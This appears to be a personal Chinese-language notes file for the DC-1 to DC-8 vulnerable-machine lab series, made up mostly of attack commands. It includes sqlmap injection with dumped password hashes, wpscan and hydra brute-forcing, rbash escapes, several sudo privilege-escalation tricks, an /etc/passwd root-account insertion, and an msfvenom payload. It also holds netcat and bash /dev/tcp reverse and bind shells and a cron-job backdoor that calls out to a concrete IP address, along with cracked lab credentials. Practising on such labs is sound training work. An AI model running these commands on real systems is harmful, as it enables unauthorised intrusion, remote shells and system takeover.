# DC记录

## DC-1

* 无终端->有终端

    ```bash
    python -c 'import pty;pty.spawn("/bin/sh")'
    python -c 'import pty;pty.spawn("/bin/bash")'
    ```
    
    > 为啥，没有终端的时候不能使用mysql等需要二次交互的命令？
    >
    > `mysql -u dbuser -p R0ck3t 2>&1`
    >
    > 还是有问题。
    >
    > 比如正确输入mysql命令，不回显，只会在输入错误的时候回显所有命令并退出mysql。
    >
    > 

## DC-2

* 重定向？

* cewl

    ```bash
    cewl dc-2 -w pds.txt
    ```

* wpscan

    ```bash
    wpscan --url dc-2 -e u
    wpscan --url dc-2 -U us.txt -P pds.txt
    ```

* `ssh -p 7744 tom@dc-2`     parturient
* jerry adipiscing

* rbash 绕过

    > https://www.freebuf.com/articles/system/188989.html

    1. vi绕过

        ```bash
        vi test
        :set shell=/bin/bash
        :shell
        这时候已经可以使用命令了，找不到是因为没有绝对路径
        可以添加，也可以直接用路径
        export PATH=$PATH:/usr/sbin:/usr/bin:/bin:/sbin
        ```

    2. `BASH_CMDS[a]=/bin/sh;a` 把/bin/bash给a变量，这样输入a就可以使用sh，而a不被rbash检测

* `sudo -l ` list user's privileges or check a specific command; use twice for longer format

* git 提权，想要提权必须要sudo，如果只是绕过rbash限制可以不用

    ```bash
    sudo git help config
    sudo git -p help
    ```


## DC-3

* ```txt
    sqlmap -u "http://192.168.1.110/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" -C "id,username,password,name" --dump -p list[fullordering]
    
    +-----+----------+--------------------------------------------------------------+-------+
    | id  | username | password                                                     | name  |
    +-----+----------+--------------------------------------------------------------+-------+
    | 629 | admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin |
    | 630 | hk       | $2y$10$Sh2iQHF9xk8k03R2WwYpa.yBiCMci1/44ZUf9wAF1/shiSH9zY6tO | hk    |
    +-----+----------+--------------------------------------------------------------+-------+
    ```
    
* `john ./db.txt --show`
    `admin:snoopy`

* ```bash
    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=4444 -f raw > text.php
    ?
    ```

* 正向shell

    * ```bash
        nc -lvp VICTIM_PORT -e /bin/sh   	# 靶机
        nc VICTIM_IP VICTIM_PORT   	# 攻击机
        ```

    * ```bash
        # 靶机
        mkfifo /tmp/fifo; /bin/sh 0< /tmp/fifo 2>&1 | nc -lvp 4444 1> /tmp/fifo; rm /tmp/fifo
        # 攻击机
        nc VICTIM_IP VICTIM_PORT
        ```


* 反向shell

    * ```bash
        bash -i <& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1   	# 靶机
        nc -lvp ATTACKER_PORT  									# 攻击机
        ```

    * ```bash
        # 靶机
        mknod /tmp/tmpPipe p
        mkfifo /tmp/tmpPipe (二选一)
        /bin/sh 0< /tmp/tmpPipe | nc ATTACKER_IP ATTACKER_PORT 1> /tmp/tmpPipe
        # 攻击机
        nc -lvp ATTACKER_PORT
        ```

## DC-4

* `hydra`

    * hydra -l root -P pass.txt -vV -o out.txt 192.168.1.118 ssh

        [22][ssh] host: 192.168.1.118   login: jim   password: jibril04

* charles    ^xHhA&hvim0y
* `sudo teehee -a /etc/passwd` 追加内容
    * `addAdmin::0:0:::/bin/bash`

## DC-5

* 文件包含

* nginx 记录里写入一句话木马

    ```
    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;
    ```

* screen 提权

## DC-6

* mark / helpdesk01
* graham - GSo7isUM1D4
* 普通sh文件提权
    * `echo /bin/bash >> shell.sh`
    * `sudo -u jens shell.sh`
* nmap提权
    * `sudo -u root nmap --script=shell.nse`

## DC-7

* PickYourOwnPassword
* `drush user-password admin --password="admin"`
* `https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz`

* `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 47.100.64.189 4444 >/tmp/f" >> backups.sh `
    * 定时任务

## DC-8

* SQL注入

    ```
    +-----+---------+---------------------------------------------------------+
    | uid | name    | pass                                                    |
    +-----+---------+---------------------------------------------------------+
    | 0   | <blank> | <blank>                                                 |
    | 1   | admin   | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |
    | 2   | john    | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |
    +-----+---------+---------------------------------------------------------+
    ```

* john爆破
    * `john passwds.txt`
    * john / turtle

* exim提权

    * `./46996.sh -m netcat`
